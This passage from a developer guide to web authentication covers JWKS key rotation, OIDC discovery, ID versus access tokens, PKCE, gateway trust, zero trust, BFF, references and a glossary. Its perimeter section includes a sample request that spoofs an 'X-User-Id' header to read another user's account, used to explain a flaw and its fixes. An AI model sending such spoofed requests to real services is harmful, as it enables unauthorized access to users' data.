A verifier reads `kid`, picks that key from the set, verifies. Note this does not reintroduce the `alg` problem from Section 3: `kid` selects a **key**, and you still pin the **algorithm** yourself. Never let `kid` choose the algorithm, and never accept a token whose `kid` you do not recognize.

**Why two keys are in that list is the entire point.** Key rotation with a shared secret is a coordinated outage: change it, and every token signed with the old one dies instantly. With JWKS:

1. Publish the new key alongside the old. Both are live.
2. Start signing with the new `kid`.
3. Tokens signed with the old key keep verifying, because the old key is still published.
4. Once the longest-lived token has expired, drop the old key.

Nobody is logged out. No coordinated deploy. Rotation becomes routine rather than an event, which is what makes it something you actually do.

Verifiers cache the JWKS (respect the cache headers) and refetch on an unknown `kid`. Any decent library does this for you. Do not fetch it per request; that is a self-inflicted denial of service on your own auth server.

### Discovery: `/.well-known/openid-configuration`

Now the verifier needs the JWKS URL, the token endpoint, the issuer, and a handful of other facts. Hardcoding them across a fleet is how you get a config drift outage.

Instead, the authorization server publishes a **discovery document** at a fixed, spec-defined path:

```http
GET https://auth.example.com/.well-known/openid-configuration
```

> Note the **hyphen** in `openid-configuration`. It is specified by [OpenID Connect Discovery 1.0](https://openid.net/specs/openid-connect-discovery-1_0.html), not a convention, and an underscore is simply a 404. It is an easy typo to make and a confusing one to debug, because everything looks right.

The response is JSON. These fields are **required** by the spec, with one caveat on `token_endpoint`:

| Field | What it is |
|---|---|
| `issuer` | The `iss` value your tokens will carry. Must match exactly |
| `authorization_endpoint` | Where you send the user to log in |
| `token_endpoint` | Where codes are exchanged for tokens. Required unless only the implicit flow is used, which today means required |
| `jwks_uri` | **Where the public keys live** |
| `response_types_supported` | Which flows are on offer |
| `subject_types_supported` | `public` or `pairwise` |
| `id_token_signing_alg_values_supported` | Which algorithms sign ID tokens |

Everything else is recommended or optional. Point a library at the issuer URL and it bootstraps the rest: finds the JWKS, caches keys, handles rotation. **One URL of configuration instead of six.**

There is a plain-OAuth sibling, `/.well-known/oauth-authorization-server`, from [RFC 8414](https://datatracker.ietf.org/doc/html/rfc8414), which generalizes the same metadata format for OAuth servers that are not doing OIDC. Same idea, different path.

![sequence diagram 4|622](sequence-4.svg)

### OIDC in one paragraph

**OAuth 2.0 answers "what is this client allowed to do?"** It was built for delegated authorization: letting an app act on your behalf without your password. It deliberately says nothing about who you are.

**OIDC is a thin identity layer on top of OAuth 2.0.** It adds the missing question: *who is this user?* Its main addition is a new token.

This distinction produces the single most common OIDC bug:

| Token | Audience | Purpose |
|---|---|---|
| **ID token** | **Your client** (the app that logged the user in) | Proves *who the user is*. Identity claims. |
| **Access token** | **Your API** (the resource server) | Proves *what the bearer may do*. |

> **Do not send the ID token to your API.** It is a documented anti-pattern, not a matter of taste. RFC 9068, the JWT profile for OAuth 2.0 access tokens, exists partly to stop it: it calls out the importance of preventing ID tokens from being accepted as access tokens, and requires resource servers to verify that the token's header `typ` is `at+jwt` and reject anything else.[^rfc9068]
>
> It is a seductive mistake because it *works*. The ID token is a JWT, it validates, it has a `sub`, your API is happy. But its `aud` names your **client**, not your API, so an API that accepts it is either not checking `aud` at all or is checking it wrongly, which means it will happily accept an ID token minted for *a different client entirely*. You have swapped a token that says "this API may be told to do X" for one that says "somebody logged into some app", and asked the second to do the first one's job.
>
> Send the **access token** to the API. Check `aud`. This is the same `restrictAudience` check from Section 3, and this is what it is for.

### Flows: there is one answer now

The flow landscape used to be a maze. It is not anymore.

**For browser apps and any public client: Authorization Code + PKCE.** That is it.

**PKCE** ([RFC 7636](https://datatracker.ietf.org/doc/html/rfc7636), "pixie") stops authorization code interception. The client generates a random verifier, sends its hash up front, and proves possession when redeeming the code. Someone who steals the code cannot use it.

**The implicit flow is over.** [RFC 9700](https://datatracker.ietf.org/doc/html/rfc9700) (BCP 240, January 2025), the OAuth 2.0 Security Best Current Practice, states plainly that clients **SHOULD NOT** use the implicit grant. It returned tokens in the URL fragment, where they land in browser history and referrer headers. If a tutorial teaches you implicit, the tutorial is old.

**OAuth 2.1** is still a **draft** as of this writing (draft-ietf-oauth-v2-1, revision 15, March 2026), not a published RFC.[^oauth21] It mostly consolidates what RFC 9700 already says: PKCE mandatory, implicit removed, password grant removed. You do not need to wait for it. Follow RFC 9700 and you are already there.

### The distinction that decides build vs buy

This is the part worth internalizing, because "should we build auth?" is the wrong question. There are two very different jobs wearing one word:

| | **Authorization server** (OIDC Provider) | **Relying party** (client / resource server) |
|---|---|---|
| Does | Issues tokens, owns login, federates, manages consent | Verifies tokens someone else issued |
| Attack surface | Enormous | Modest |
| Build it yourself? | **No** | **Yes, with a library** |

Being a **relying party** is a normal engineering task. Point a library at a discovery URL, verify tokens, check `aud` and `iss`. This document has essentially taught you the verification half of it.

Being an **authorization server** is a different sport. [RFC 6819](https://datatracker.ietf.org/doc/html/rfc6819), the OAuth threat model, catalogues **more than a dozen distinct attacks against the authorization code flow alone** (Section 4.4.1 lists thirteen): code interception and replay, redirect URI validation flaws, clickjacking on the authorization endpoint, CSRF on the callback, scope escalation, mix-up attacks. You must defend all of them, simultaneously, across web, mobile, and machine clients, forever. This is why essentially nobody, including companies that could afford to, writes their own.

**Everything in this guide is the relying-party half plus a minimal issuer for a single service.** That combination is legitimate and common and it is what you should build first. Just know which half is which, so that when you add the fifth service you reach for a provider instead of scaling up a design that was never meant to go there.

### If you do reach for a provider

| | Model | Language | Notes |
|---|---|---|---|
| **Keycloak** | Open source, self-hosted | Java | CNCF incubating project.[^keycloak-cncf] OIDC, OAuth 2.0, and SAML. The default answer for on-prem. You are operating a Java service and a database. |
| **Zitadel** | Open source, self-host or cloud | Go | API-first, multi-tenant from the ground up. Lighter to run than Keycloak. |
| **Ory** (Hydra, Kratos) | Open source, self-host or cloud | Go | Hydra is an OpenID-certified OAuth2/OIDC server. Composable rather than all-in-one. |
| **Logto** | Open source, self-host or cloud | TypeScript | Newer, developer-focused. |
| **Supabase Auth** | Open source, self-host or cloud | | Natural fit if you are already on Postgres and using row-level security. |
| **Auth0** | SaaS only | | Owned by Okta. Excellent developer experience. Costs scale with users. |
| **Okta** | SaaS only | | Workforce identity. |
| **AWS Cognito** | Managed AWS | | Cheap and deeply integrated if you are already on AWS. Lock-in. |
| **Microsoft Entra ID** | SaaS | | Enterprise and Microsoft-shop default. |
| **Clerk** | SaaS only | | Ships pre-built UI components. Fast to start. |

The real choice is not features, it is **who gets paged.** Self-hosted means you own upgrades, availability, and the database behind your entire login system. SaaS means you own a bill and a dependency. Both are fine. Choosing self-hosted because it is free, and then not staffing it, is not.

And write the decision down as an ADR. "Why are we on this thing?" asked eighteen months later, with no answer, is how you end up with two half-migrations.

### Perimeter security, and the trap in it

Once you have several services, the question becomes: **who checks the token?**

**Option A: the gateway.** Validate once at the edge; internal services trust what got through. Fast, one place for policy.

**Option B: every service.** Each validates independently. More work, no implicit trust.

The honest answer is a blend, and OWASP's Microservices guidance points at it: **centralize policy, distribute enforcement**. Its recommended pattern is a centrally defined policy evaluated by a decision point embedded in each service.[^owasp-micro] One place decides the rules; each service still applies them.

But here is the trap, and it is the most common serious mistake in this whole area:

> **The gateway validates the JWT, then sets `X-User-Id: 123` on the internal request. Downstream services read that header and trust it.**

It is fast, it is tidy, every service gets clean code. And it is only secure for as long as **the gateway is the sole possible path to those services**, which is a claim about your network, not about your code.

The moment anything else can reach the service directly, a pod in the same cluster, a developer's port-forward, a misconfigured load balancer, a compromised neighboring container, a service accidentally exposed, then an attacker sends:

```http
GET /api/secure/account
X-User-Id: 1
```

and your service cheerfully serves user 1's data. **No token required.** You did not authenticate; you read a header the attacker typed. Your entire auth system has been reduced to a request header, and the only thing that was ever protecting it was a network topology assumption that nobody wrote down and that Kubernetes will happily violate.

![flowchart diagram 8|622](flowchart-8.svg)

Mitigations, in increasing order of actually working:

1. **Services strip inbound `X-User-*` headers** rather than trusting them. Necessary, insufficient: it does nothing about a direct call.
2. **Authenticate the gateway itself** with mTLS, so a service accepts internal headers only from a caller that has cryptographically proven it is the gateway.
3. **Forward the token and let each service verify it.** With RS256 and JWKS this is cheap: a public-key signature check and no network call. This is the one that does not depend on a network assumption.

Prefer 3. Use 2 where you must. Never rely on 1 alone.

### Zero trust, briefly

That trap is a single instance of a general principle. NIST SP 800-207 defines Zero Trust as assuming there is **"no implicit trust granted to assets or user accounts based solely on their physical or network location."**[^nist-207]

Translated: *being inside the network is not a credential.* The old model, hard shell and soft interior, assumed the perimeter would hold. It does not. Container platforms, third-party dependencies, and SaaS integrations mean there is no meaningful "inside" anymore.

For service-to-service, that means every call is authenticated on its own merits:

- **mTLS.** Both sides present certificates. The caller proves who it is; the network proves nothing.
- **SPIFFE / SPIRE.** A CNCF standard and implementation for giving workloads cryptographic identity and rotating their certificates automatically, so nobody is hand-distributing keys to containers. This is the grown-up answer to "how does a pod prove it is the payments service?"
- **Service mesh** (Istio, Linkerd). Provides mTLS between services by default, with certificate rotation handled for you and deny-by-default policy, without application code changes. Most of the value, most of the time, and the fastest route to "the network is no longer a credential".
- **Token exchange** ([RFC 8693](https://datatracker.ietf.org/doc/html/rfc8693)). When service A must call service B *on behalf of a user*, it exchanges the user's token for a scoped-down one for B. This is what you use instead of forwarding a powerful token onward and hoping.

### BFF: where this guide's cookie stance leads

One pattern deserves a name here because Section 4 has already been walking you toward it.

The **Backend for Frontend** puts a thin server-side component between your SPA and everything else. The browser holds a session **cookie** and nothing more. The BFF holds the OAuth tokens, server-side, and does the talking.

Look at what that gives you: OIDC tokens **never reach the browser at all**. There is no token for XSS to steal, because there is no token in the page. The browser gets an `httpOnly` cookie, which is precisely what Section 4 argued for, and the BFF gets to be a confidential client, which is a category the browser can never be.

It is the natural destination of the reasoning in this document. If you adopt an external provider and your client is a browser, this is very likely the shape you want.

### When to leave

You are ready to move off a hand-rolled issuer when any of these is true:

- **You are about to copy a signing secret into a second service.** The clearest signal there is.
- **Someone asks for "Sign in with Google"** and you are contemplating writing the OAuth dance yourself.
- **Someone asks for SSO or SAML.** Enterprise buyers will. Do not write this.
- **You need MFA, passkeys, or device management**, and you are looking at months to build what a provider ships.
- **Multiple applications** need one login.
- **An auditor asks** who can mint a token, and the honest answer is a list.

Until then, what you have built here is not a toy. A single service, an httpOnly cookie, a short access token, a rotating refresh token with reuse detection, and risk-based step-up on the paths that matter is a genuinely solid system, and better than plenty of things running in production behind a brand name.

**Know which assumption you are standing on, and notice the day it stops being true.**

## 11. Standards and References

The guidance here is aligned to the following. Read them; they are short and they are the source.

### OWASP Cheat Sheet Series

- [Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) - cookie attributes, `Cache-Control: no-store`, server-side invalidation, token entropy
- [JSON Web Token](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html) - explicit algorithm verification, `jti` denylisting, HMAC secret sizing, cookie max-age
- [Authentication](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Forgot Password](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html) - consistent responses in content and time, single-use TTL'd tokens, no auto-login
- [Multifactor Authentication](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html) - SMS as a restricted authenticator, adaptive authentication
- [Credential Stuffing Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html)

### NIST

- [SP 800-63B-4, Digital Identity Guidelines: Authentication and Authenticator Management](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63B-4.pdf) - PSTN/SMS restricted status, throttling requirements. Revision 4 (July 2025) replaced the withdrawn Revision 3

### IETF

- [RFC 7519](https://datatracker.ietf.org/doc/html/rfc7519) - JSON Web Token
- [RFC 8725](https://datatracker.ietf.org/doc/html/rfc8725) - JWT Best Current Practices
- [RFC 7517](https://datatracker.ietf.org/doc/html/rfc7517) - JSON Web Key (JWKS)
- [RFC 7636](https://datatracker.ietf.org/doc/html/rfc7636) - PKCE
- [RFC 8414](https://datatracker.ietf.org/doc/html/rfc8414) - OAuth 2.0 Authorization Server Metadata
- [RFC 8693](https://datatracker.ietf.org/doc/html/rfc8693) - OAuth 2.0 Token Exchange
- [RFC 6819](https://datatracker.ietf.org/doc/html/rfc6819) - OAuth 2.0 Threat Model. Read this before considering writing an authorization server
- [RFC 9700](https://datatracker.ietf.org/doc/html/rfc9700) - OAuth 2.0 Security Best Current Practice (BCP 240, January 2025). Supersedes a lot of older advice; implicit flow is out, PKCE is in

### OpenID

- [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html)
- [OpenID Connect Discovery 1.0](https://openid.net/specs/openid-connect-discovery-1_0.html) - the `/.well-known/openid-configuration` document and its required fields

### NIST (architecture)

- [SP 800-207, Zero Trust Architecture](https://csrc.nist.gov/publications/detail/sp/800-207/final) - the "network location is not a credential" principle

Note on OAuth 2.1: it is an **active Internet-Draft**, not a published RFC. It largely consolidates RFC 9700. Follow RFC 9700 today and you are aligned with where 2.1 is going.

### Where this guide is stricter than OWASP

Worth knowing, so you can tell a rule from a preference:

- **Constant-time comparison for tokens and OTPs.** OWASP's sheets defer signature comparison to libraries and do not call it out for hand-rolled code. This guide asks for it explicitly, because the hand-rolled path is exactly where it goes missing.
- **Allowlist over denylist.** OWASP describes `jti` **denylisting** for logout.[^owasp-jwt] This guide uses a **jti allowlist**: a token is valid only if its `jti` is present. Same goal, default-deny instead of default-allow. It satisfies OWASP's rule of never keying on the raw JWT.
- **Attempt limits.** NIST caps consecutive failed attempts at 100 per authenticator.[^nist-throttle] This guide uses 3 per factor.

### Where OWASP contradicts itself, and what this guide picked

**Token storage.** OWASP does not speak with one voice here, and you should know that before someone cites the other sheet at you in review.

- The **JWT** cheat sheet suggests `sessionStorage` or JavaScript closures, and permits `localStorage` provided strict security controls are in place.[^owasp-jwt]
- The **Session Management** cheat sheet is categorical: *"Do not store authentication tokens, session IDs, JWTs, refresh tokens, or any credential in localStorage or sessionStorage"*, and calls `HttpOnly` protection *"mandatory"*.[^owasp-session]

This guide follows **Session Management**. Anything reachable from `document` is reachable from any script on the page, and `sessionStorage` is no better than `localStorage` against XSS; it is only shorter-lived. The JWT sheet's advice is aimed at contexts where cookies are not viable, and it trades an XSS problem for a CSRF problem you must then solve. If your client is a browser, use httpOnly cookies with `SameSite`.

## 12. Glossary

**Access token** - Short-lived credential sent on every request. Cannot be revoked; keep the TTL small.

**AEAD** - Authenticated Encryption with Associated Data. Encryption that also detects tampering, producing an auth tag that must verify before the plaintext is released. `aes-256-gcm` is the common choice. Prefer it over bare CBC, which hides content but cannot tell you it was modified.

**Authorization server** - The thing that issues tokens and owns login. Writing your own is a large, specialist job (see RFC 6819). Use a provider once you need more than one service's worth.

**Bearer token** - Any token where holding it is sufficient to use it. No proof of identity beyond possession. Both tokens here are bearer tokens; that is why theft matters so much.

**BFF (Backend for Frontend)** - A server-side component between your SPA and your APIs. The browser holds only a cookie; the BFF holds the tokens. There is no token in the page for XSS to steal.

**Claim** - A key/value pair in a JWT payload. `sub`, `exp`, `iss` are claims.

**CSRF** - Cross-Site Request Forgery. Another site causes the browser to send an authenticated request to yours. Mitigated by `sameSite`.

**Device fingerprint** - A hash of request properties (user-agent, language, network) used to weakly bind a token to the device that obtained it.

**Discovery document** - JSON metadata at `/.well-known/openid-configuration` (hyphen, spec-defined) telling clients the issuer, endpoints, and `jwks_uri`. One URL of config instead of six.

**exp / iat / nbf** - Expiration, Issued At, Not Before. All in seconds since the Unix epoch.

**Fail closed** - When a check cannot run, deny. The opposite, fail open, means your security control disables itself exactly when it is under stress.

**HS256** - HMAC with SHA-256. Symmetric: one secret both signs and verifies.

**httpOnly** - A cookie flag making the cookie invisible to JavaScript. The single most valuable line in this document.

**IDOR** - Insecure Direct Object Reference. Handing the client a real internal identifier and relying solely on access checks to stop them using it on records that are not theirs. The reason a raw database id does not belong in `sub`.

**ID token** - OIDC's identity token. It is for **your client**, to establish who logged in. It is **not** for your API; that is the access token's job, and sending an ID token to a resource server is a documented anti-pattern.

**JTI** - JWT ID. A unique id per token. Storing it lets you revoke a token you otherwise could not.

**JWKS** - JSON Web Key Set (RFC 7517). Public keys published at a URL so verifiers can fetch them instead of being shipped key material. What makes painless key rotation possible.

**JWT** - JSON Web Token. Signed, **not encrypted**. Anyone can read the payload.

**kid** - Key ID. A JWT header claim naming which key from the JWKS signed this token. It selects a **key**, never an algorithm. Pin the algorithm yourself.

**mTLS** - Mutual TLS. Both sides present certificates, so the caller proves its identity cryptographically rather than by being on the right network.

**Nonce / IV** - "Number used once" / Initialization Vector. Random data fed alongside the key so the same plaintext encrypts differently every time. Not secret, and must travel with the ciphertext. **Reusing one with the same key breaks the cipher**, and for GCM it breaks it completely.

**OAuth 2.0** - A delegated **authorization** framework. Answers "what may this client do?" Says nothing about who the user is.

**OIDC (OpenID Connect)** - A thin **identity** layer on top of OAuth 2.0. Adds the ID token and answers "who is this user?"

**PKCE** - Proof Key for Code Exchange (RFC 7636, said "pixie"). Stops a stolen authorization code being redeemed by anyone but the client that requested it. Mandatory for public clients; use it everywhere.

**Refresh token** - Longer-lived credential whose only job is minting access tokens. Revocable because it is checked against a store.

**Relying party** - An application that *consumes* tokens from an authorization server rather than issuing them. Being a relying party is a normal task with a library. Being an authorization server is not.

**Reuse detection** - Noticing a rotated (burned) refresh token being presented again, which implies two parties hold it, and revoking the whole family in response.

**Restricted authenticator** - NIST's designation for a factor with known weaknesses that may still be used, with caveats and a migration path. PSTN out-of-band delivery, meaning SMS and voice codes, is restricted. Not banned, but not something to build on.

**RS256** - RSA with SHA-256. Asymmetric: private key signs, public key verifies. Use when many services verify but only one mints.

**Rotation** - Issuing a new refresh token on every refresh and burning the old one, making each single-use. The precondition for reuse detection.

**sameSite** - A cookie flag controlling whether the cookie is sent on cross-site requests. `strict`, `lax`, or `none`.

**SIM swap** - Persuading a mobile carrier to move a victim's number to an attacker's SIM, after which every SMS code goes to the attacker. A social engineering attack against a company you do not control, which is why SMS is a restricted factor.

**Single-flight** - Collapsing N concurrent identical operations into one, with all callers awaiting the same promise.

**SPIFFE / SPIRE** - A CNCF standard and its implementation for giving workloads cryptographic identity and rotating their certificates automatically. The answer to "how does a container prove it is the payments service?"

**Step-up authentication** - Demanding additional proof for a risky action, rather than rejecting it outright.

**Token exchange** - RFC 8693. Swapping a token for a scoped-down one before calling a downstream service, instead of forwarding a powerful token and hoping.

**Token family** - All refresh tokens descended from one login. The unit of revocation when reuse is detected.

**TOTP** - Time-based One-Time Password. The 6-digit rotating code in an authenticator app. A shared secret and a clock, with no carrier in the trust path. Strictly better than SMS.

**WebAuthn / passkey** - Public-key authentication built into the browser and OS. The private key never leaves the device and signatures are bound to the origin, which makes it **phishing-resistant**: a fake site cannot use a signature meant for the real one. The strongest factor generally available, and the one to migrate toward.

**XSS** - Cross-Site Scripting. Hostile JavaScript running on your origin. The reason tokens do not go in localStorage.

**Zero Trust** - NIST SP 800-207: no implicit trust based on network location. Being inside the perimeter is not a credential. Every call authenticates on its own merits.

<!-- Footnote definitions. GitHub and Obsidian render these as a numbered list at the bottom of the page. -->

[^numericdate]: [RFC 7519, Section 2](https://datatracker.ietf.org/doc/html/rfc7519#section-2): NumericDate is "the number of seconds from 1970-01-01T00:00:00Z UTC until the specified UTC date/time, ignoring leap seconds."

[^objectid]: [MongoDB Manual, ObjectId](https://www.mongodb.com/docs/manual/reference/method/ObjectId/): "a 4-byte timestamp, representing the ObjectId's creation, measured in seconds since the Unix epoch." Ordering is only approximate, which is all an attacker needs.

[^gcm-nonce]: [NIST SP 800-38D](https://nvlpubs.nist.gov/nistpubs/legacy/sp/nistspecialpublication800-38d.pdf): Section 8 makes IV uniqueness a hard requirement, and Section 5.2.1.1 recommends 96-bit IVs. The forgery consequence of reuse is Joux's "forbidden attack", demonstrated against real TLS servers in [Böck, Zauner, Devlin, Somorovsky, and Jovanovic, "Nonce-Disrespecting Adversaries" (2016)](https://eprint.iacr.org/2016/475.pdf).

[^createcipher]: [Node.js DEP0106](https://nodejs.org/api/deprecations.html#DEP0106): `crypto.createCipher` and `crypto.createDecipher` reached end of life in [Node.js 22.0.0](https://nodejs.org/en/blog/release/v22.0.0).

[^cookie-size]: [RFC 6265, Section 6.1](https://datatracker.ietf.org/doc/html/rfc6265#section-6.1) sets a floor of 4096 bytes per cookie (name plus value plus attributes); browsers cap near that figure ([MDN: Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies)).

[^rfc7518]: [RFC 7518, Section 3.2](https://www.rfc-editor.org/rfc/rfc7518#section-3.2): "A key of the same size as the hash output (for instance, 256 bits for 'HS256') or larger MUST be used with this algorithm."

[^rfc8725-typ]: [RFC 8725, Section 3.11](https://datatracker.ietf.org/doc/html/rfc8725#section-3.11), "Use Explicit Typing."

[^rfc8725-alg]: [RFC 8725, Section 3.1](https://datatracker.ietf.org/doc/html/rfc8725#section-3.1): "Libraries MUST enable the caller to specify a supported set of algorithms and MUST NOT use any other algorithms when performing cryptographic operations."

[^rfc7519-exp]: [RFC 7519, Section 4.1.4](https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.4): `exp` "identifies the expiration time on or after which the JWT MUST NOT be accepted for processing." `nbf` ([Section 4.1.5](https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.5)) is OPTIONAL.

[^timingsafeequal]: [Node.js crypto documentation](https://nodejs.org/api/crypto.html#cryptotimingsafeequala-b): the inputs "must have the same byte length. An error is thrown if the inputs have different byte lengths."

[^owasp-session]: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html): "Do not store authentication tokens, session IDs, JWTs, refresh tokens, or any credential in localStorage or sessionStorage"; HttpOnly "protection is mandatory to prevent session ID stealing through XSS attacks"; session identifiers must never be cached, with `Cache-Control: no-store` the recommended directive.

[^owasp-jwt]: [OWASP JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_Cheat_Sheet.html): set the cookie Max-Age "to a value equal to or less than the JWT's expiry time"; revocation via a denylist keyed on a (`jti`, `iss`) pair; browser storage permitted only under strict security controls.

[^mdn-samesite]: [MDN: Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies): with `Lax`, "the browser also sends the cookie when the user navigates to the cookie's origin site (even if the user is coming from a different site)"; cross-site subresource requests and cross-site POSTs do not carry it.

[^mdn-withcredentials]: [MDN: XMLHttpRequest.withCredentials](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials): "Setting withCredentials has no effect on same-origin requests."

[^rfc9700-refresh]: [RFC 9700 (BCP 240), Section 2.2.2](https://datatracker.ietf.org/doc/html/rfc9700#section-2.2.2): "Refresh tokens for public clients MUST be sender-constrained or use refresh token rotation as described in Section 4.14." Section 4.14.2 covers rotation and revoking the family on reuse.

[^rfc9110]: [RFC 9110, Section 15.5.2](https://datatracker.ietf.org/doc/html/rfc9110#section-15.5.2): 401 means the request "lacks valid authentication credentials for the target resource." [Section 15.5.4](https://datatracker.ietf.org/doc/html/rfc9110#section-15.5.4): 403 means the server "understood the request but refuses to fulfill it."

[^nist-restricted]: [NIST SP 800-63B-4](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63B-4.pdf), Sections 3.1.3.3 and 3.2.9: "At the time of publication of these guidelines, there is one restricted authenticator: the use of the PSTN for out-of-band authentication."

[^nist-email]: [NIST SP 800-63B-4](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63B-4.pdf), Section 3.1.3.1: "Email SHALL NOT be used for out-of-band authentication" because it is vulnerable to access with only a password, interception in transit or at intermediate mail servers, and rerouting attacks.

[^owasp-mfa]: [OWASP Multifactor Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html): SMS and PSTN codes are restricted "because of SS7 interception, SIM-swap, and number-porting attacks"; "Do not use SMS for high-value or PII-handling applications"; "plan migration to TOTP, push notifications, or WebAuthn/FIDO2."

[^owasp-forgot]: [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html): "Return a consistent message for both existent and non-existent accounts"; "Ensure that responses return in a consistent amount of time to prevent an attacker enumerating which accounts exist"; "Don't automatically log the user in."

[^nist-throttle]: [NIST SP 800-63B-4](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63B-4.pdf), Section 3.2.2: verifiers "SHALL limit consecutive failed authentication attempts using a specific authenticator on a single subscriber account to no more than 100."

[^rfc9068]: [RFC 9068](https://datatracker.ietf.org/doc/html/rfc9068), Sections 2.1 and 4: resource servers "MUST verify that the `typ` header value is `at+jwt` or `application/at+jwt` and reject tokens carrying any other value," which is what keeps an ID token from passing as an access token.

[^oauth21]: [draft-ietf-oauth-v2-1](https://datatracker.ietf.org/doc/draft-ietf-oauth-v2-1/): revision 15, dated March 2026, is still an active Internet-Draft.

[^keycloak-cncf]: [CNCF: Keycloak](https://www.cncf.io/projects/keycloak/), an incubating project since April 2023.

[^owasp-micro]: [OWASP Microservices Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Microservices_Security_Cheat_Sheet.html): "The recommended pattern for service-level authorization is 'Centralized pattern with embedded PDP'."

[^nist-207]: [NIST SP 800-207, Zero Trust Architecture](https://csrc.nist.gov/pubs/sp/800/207/final): "Zero trust assumes there is no implicit trust granted to assets or user accounts based solely on their physical or network location."

[^axios-interceptors]: [Axios documentation: Interceptors](https://axios-http.com/docs/interceptors).
